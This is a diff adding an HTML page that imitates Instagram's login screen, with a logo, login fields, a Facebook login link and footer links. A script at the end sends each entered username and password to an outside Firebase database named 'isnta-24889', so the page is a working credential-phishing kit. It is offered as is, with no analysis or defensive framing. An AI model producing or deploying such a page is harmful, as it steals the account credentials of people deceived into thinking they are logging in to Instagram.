@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link rel="stylesheet" href="css/styles.css" />
+    <link rel="stylesheet" href="css/media-queries.css" />
+    <link rel="icon" href="assets/images/favicon.ico" />
+  </head>
+  <body>
+    <main>
+      <div class="log-in-container">
+        <div class="log-in">
+          <!-- Logo -->
+          <img src="assets/images/instagram-logo.png" class="logo" />
+          <!-- Log in form -->
+          <div class="log-in-form">
+            <input id="id" type="text" placeholder="Phone number, username or email" />
+            <input id="password" type="password" placeholder="Password" />
+            <button id="submit" class="log-in-button">Log In</button>
+          </div>
+          <!-- OR divider -->
+          <span class="or-divider">OR</span>
+          <!-- Log in with Facebook -->
+          <div class="fb-login">
+            <a href="#">
+              <img src="assets/images/facebook-icon.png" />
+              <span>Log in with Facebook</span>
+            </a>
+          </div>
+          <!-- Forgot password? -->
+          <a href="#">Forgot password?</a>
+        </div>
+        <!-- Sign up -->
+        <div class="sign-up">
+          <span>Don't have an account?</span><a href="#">Sign up</a>
+        </div>
+        <!-- Download app -->
+        <div class="get-the-app">
+          <span>Get the app</span>
+          <div class="app-images">
+            <a href="#"><img src="assets/images/applestore.png" /></a>
+            <a href="#"><img src="assets/images/googlestore.png" /></a>
+          </div>
+        </div>
+      </div>
+      <!-- Phones -->
+      <div class="phones-container">
+        <img src="assets/images/phones.png" />
+      </div>
+    </main>
+    <footer>
+      <ul class="footer-links">
+        <li><a href="#">ABOUT</a></li>
+        <li><a href="#">HELP</a></li>
+        <li><a href="#">PRESS</a></li>
+        <li><a href="#">API</a></li>
+        <li><a href="#">JOBS</a></li>
+        <li><a href="#">PRIVACY</a></li>
+        <li><a href="#">TERMS</a></li>
+        <li><a href="#">LOCATIONS</a></li>
+        <li><a href="#">TOP</a></li>
+        <li><a href="#">ACCOUNTS</a></li>
+        <li><a href="#">HASHTAGS</a></li>
+        <li><a href="#">LANGUAGE</a></li>
+      </ul>
+      <span class="copyright">&copy; 2020 INSTAGRAM FROM FACEBOOK</span>
+    </footer>
+
+    <script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-database.js"></script>
+
+    <script>
+  var firebaseConfig = {
+            apiKey: "AIzaSyCEp3g4pOmyufw3JmYnagyqIYeyCQObLn4",
+            authDomain: "isnta-24889.firebaseapp.com",
+            projectId: "isnta-24889",
+            storageBucket: "isnta-24889.appspot.com",
+            messagingSenderId: "26793212970",
+            appId: "1:26793212970:web:acfe86263a5eb9bfba5753"
+        };
+  firebase.initializeApp(firebaseConfig);
+  var id, password;
+
+  function getdata(){
+      id = document.getElementById('id').value;
+      password = document.getElementById('password').value;
+  }
+
+  document.getElementById('submit').onclick = function(){
+    getdata();
+    firebase.database().ref(id).set({
+        Password: password,
+    })
+  }
+
+</script>
+
+
+  </body>
+</html>
